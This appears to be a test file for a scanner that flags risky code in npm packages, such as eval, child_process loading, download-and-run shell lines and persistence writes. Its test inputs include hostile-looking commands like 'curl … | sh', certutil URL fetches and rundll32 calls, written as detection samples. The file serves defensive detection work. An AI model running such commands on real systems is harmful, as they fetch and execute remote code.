  assert.equal(found('setup.bat', ':: certutil -urlcache -f http://1.2.3.4/x\r\nREM curl https://x.example\r\nrem rundll32 x.dll,Main\r\n@REM curl https://x.example\r\necho ok & REM curl https://x.example\r\necho ok || rem rundll32 x.dll,Main\r\n'), null, 'cmd\'s comments')
  assert.deepEqual(found('setup.sh', '# fetch it\ncurl -s http://1.2.3.4/x | sh # and run it\n'), { shell: [2] }, 'a command after a comment, where it is')
  for (const hashbang of ['#!/bin/ksh', '#!/usr/bin/env pwsh', '#!/usr/bin/env -S bash -e', '#!/usr/local/bin/zsh']) {
    assert.deepEqual(found('bin/install', `${hashbang}\ncurl https://x.example/p -o p\n`), { shell: [2] }, hashbang)
  }
  assert.deepEqual(found('payload.js', '#!/bin/sh\ncurl https://x.example/p | sh\n'), { shell: [2] }, 'a shell\'s hashbang whatever the extension')
  assert.deepEqual(found('bin/cli.js', '#!/bin/sh\n":" //; exec node "$0" "$@"\neval(x)\n'), { eval: [3] }, 'and read as JavaScript too, as a launcher is both')
  assert.equal(found('run.sh', 'eval "$(cat x)"\nnode -e "require(\'child_process\')"\n'), null, 'none of a script\'s other kinds, its text no JavaScript')
  assert.equal(found('README.md', 'curl -fsSL https://example.com/install.sh | sh\n'), null, 'prose is no script')
})

test('a template literal\'s substitutions are code, read as their own, its text not', () => {
  assert.deepEqual(found('a.js', 'const t = `${eval(payload)}`\n'), { eval: [1] })
  assert.deepEqual(found('a.js', 'const t = `a ${x} b ${require(\'child_process\').exec(c)}`\n'), { 'child-process': [1] }, 'a module named in one')
  assert.deepEqual(found('a.js', 'const t = `one\n${\n  "}" + Function(y)\n}`\n'), { function: [3] }, 'to the brace that closes it, its line the file\'s')
  for (const substitution of ['/* } */ eval(payload)', ' /* } */ eval(payload)', 'x // }\n eval(payload)', '/}/.test(x) && eval(payload)', "'}' + eval(payload)", '{ a: 1 }.a + eval(payload)']) {
    assert.deepEqual(found('a.js', `const t = \`\${${substitution}}\`\n`), { eval: [substitution.split('\n').length] },
      `braces in a comment, a regular expression, a string or balanced aside: ${substitution}`)
  }
  assert.equal(found('a.js', 'const t = `\\${eval(x)} eval(y) ${f("eval(")} ${/* eval(z) */ w}`\n'), null, 'not an escaped one, nor a string or comment in one')
  assert.deepEqual(found('a.js', 'const t = `\\\\${eval(x)}`\n'), { eval: [1] }, 'after an escaped backslash, live')
  assert.deepEqual(found('a.js', 'const t = `a \\\n${eval(x)}`\n'), { eval: [2] }, 'after a line continuation')
  assert.deepEqual(found('a.js', 'const t = `a \\\r\n${eval(x)}`\r\n'), { eval: [2] }, 'after a CRLF continuation')
})

test('a name read as another or as a property, or in a string, a regular expression or a comment, is none', () => {
  assert.equal(found('a.js', 'vm.eval(x); evaluate(); myeval(); obj.eval\nx.Function(1); Function.prototype.call\n'), null)
  assert.equal(found('a.js', 'vm . eval(payload)\nvm.\neval(p)\nobj . Function("x")\nobj?. Function("y")\nobj./* c */eval(z)\n'), null, 'a property after blanks or a comment too')
  assert.equal(found('a.js', 'const builtin = "child_process"\nconst builtins = [\'fs\', \'child_process\']\n'), null, 'a module named, not loaded')
  assert.equal(found('a.ts', 'import type { ChildProcess } from \'node:child_process\'\nexport type { ChildProcess as CP } from "child_process"\n'
    + 'import /* explanation */ type { ChildProcess } from \'node:child_process\'\nexport /* c */ type { CP } from "child_process"\n'), null,
    'a type-only import or export, erased, comments in it or not')
  assert.deepEqual(found('a.ts', 'import typeX from \'child_process\'\n'), { 'child-process': [1] }, 'a default named typeX')
  assert.equal(found('a.ts', 'import type cp = require(\'child_process\')\n'), null, 'a type-only import-equals, erased')
  assert.deepEqual(found('a.ts', 'import cp = require(\'child_process\')\nimport type = require("child_process")\n'), { 'child-process': [1, 2] },
    'an import-equals, and one named type')
  assert.equal(found('a.js', "const s = 'a \\\r\neval(x)'\r\nconst d = \"b \\\r\nFunction(y)\"\r\n"), null, 'a string continued past a CRLF')
  assert.equal(found('a.js', '// eval(x)\n/* new Function(a) */\nconst s = "eval(" + \'Function(\'\nconst re = /eval\\(/u\n'), null)
  assert.equal(found('a.js', 'const docs = "see child_process"\n// require("child_process")\n'), null, 'a string naming a module only where it is one')
  assert.equal(found('a.js', "const s = 'a \\\neval(x)'\nconst d = \"b \\\nFunction(y)\"\n"), null, 'a string continued on the next line')
})

test('a declaration file is read as node runs it, its types stripped', () => {
  assert.deepEqual(found('index.d.ts', 'export declare const x: number\neval(payload)\nimport { spawn } from \'child_process\'\n'), { eval: [2], 'child-process': [3] })
  assert.equal(found('lib.d.ts', 'declare function eval(x: string): any\nfunction /* c */ eval() {}\nimport type { ChildProcess } from \'child_process\'\n'), null,
    'a function named eval, declared, and a type-only import, both stripped')
  assert.equal(found('lib.dom.d.ts', 'interface I {\n    eval?: Values;\n}\n'), null, 'a property typed optional')
  assert.deepEqual(found('a.js', 'const run = c ? eval : f\n'), { eval: [1] }, 'eval chosen in a ternary')
})

test('what is no script runs nothing: prose, data', () => {
  assert.equal(found('README.md', 'Never call eval(x); use child_process carefully.\n'), null)
  assert.equal(found('data.json', '{"eval(":1}\n'), null)
  assert.equal(found('a.js', undefined), null, 'binary')
  assert.equal(found('a.js', 'module.exports = {}\n'), null)
})

test('a text reads in time as its length, what is left open read to its end', { timeout: 10_000 }, () => {
  // Each took minutes to read when a lookbehind scanned back over each blank
  // run anew, or a comment, a regular expression's class or a string left
  // open was tried again from each later slash or quote.
  for (const [text, runs] of [
    [`x${' '.repeat(1e6)}eval(1)\n`, { eval: [1] }],
    [`vm.${' '.repeat(1e6)}eval(1)\n`, null],
    [`${'Function/*'.repeat(1e5)}\neval(1)\n`, null],
    [`${'[/'.repeat(5e5)}\neval(1)\n`, { eval: [2] }],
    [`"${'\\"'.repeat(5e5)}\neval(1)\n`, { eval: [2] }],
    [`\`${'\\`'.repeat(5e5)}\neval(1)\n`, null],
  ]) assert.deepEqual(found('a.js', text), runs)
  for (const [text, runs] of [
    [`${"'npm', 'publish', ".repeat(1e5)}\n`, { publish: [1] }],
    [`${"{ method: 'PUT' }, ".repeat(1e5)}'https://registry.npmjs.org'\n`, { publish: [1] }],
    [`${'JSON.stringify( '.repeat(1e5)}process.env)\n`, { env: [1] }],
    [`'npm'${' '.repeat(1e6)}'publish'\n`, { publish: [1] }],
    [`"${'curl '.repeat(2e5)}"\n`, null],
    [`"${'certutil '.repeat(2e5)}"\n`, null],
    [`${"'.claude', ".repeat(1e5)}'settings.json'\n`, { persistence: [1] }],
    [`${"'curl', ".repeat(1e5)}'https://x'\n`, { shell: [1] }],
    [`'curl', '${'x'.repeat(1e6)}', ${"'-x', ".repeat(1e5)}'https://x'\n`, null],
    [`${"'systemd', ".repeat(1e5)}'user'\n`, { persistence: [1] }],
    [`'systemctl', ${"'--user', ".repeat(1e5)}\n`, null],
    [`"${'sh |'.repeat(3e5)}"\n`, null],
    [`"${' '.repeat(1e6)}|sh"\n`, { shell: [1] }],
    [`'${'npm --a '.repeat(1e5)}publish'\n`, { publish: [1] }],
  ]) assert.deepEqual(found('a.js', text), runs)
  // A minute, when each hit copied those before it; its first lines alone
  // kept (NPM_MAX_FOUND).
  assert.deepEqual(npmRunsCode('a.js', 'eval(x)\n'.repeat(1e5)).get('eval'), Array.from({ length: 100 }, (_, i) => i + 1), 'its first hits\' lines')
})
